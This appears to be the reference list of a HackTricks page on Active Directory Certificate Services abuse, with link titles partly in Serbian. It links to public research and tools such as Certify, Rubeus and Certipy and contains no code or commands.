- [3] [Certify 2.0 – SpecterOps blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Zloupotreba Active Directory Certificate Services-a](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, nove authentication i request metode i još mnogo toga](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Zloupotreba Key Trust Account Mapping-a za preuzimanje naloga](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Priča o Enhanced Key (mis)Usage-u](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying ka AD Certificate Services-u preko RPC-a](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell pristup ADCS CA-u pomoću YubiHSM-a](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Ne samo još jedan AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Pogrešna konfiguracija i eksploatacija](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
